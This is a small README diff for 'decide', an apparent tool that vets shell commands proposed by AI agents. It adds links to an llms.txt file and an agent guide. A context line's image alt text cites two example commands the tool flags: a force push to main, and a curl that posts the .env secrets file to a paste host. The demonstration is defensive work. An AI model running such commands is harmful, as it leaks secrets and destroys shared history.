@@ -17,6 +17,8 @@ answers with probabilities.**
 **Docs: [decide.deepnoodle.ai](https://decide.deepnoodle.ai)**, with a
 [quickstart](https://decide.deepnoodle.ai/start/), [tutorials](https://decide.deepnoodle.ai/tutorials/check-agent-commands/),
 and the [reference](https://decide.deepnoodle.ai/reference/).
+Agents can start with [llms.txt](https://decide.deepnoodle.ai/llms.txt) or the
+[agent guide](https://decide.deepnoodle.ai/reference/agents/).
 
 [![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-9d19d0263961.gif)](https://decide.deepnoodle.ai)
 
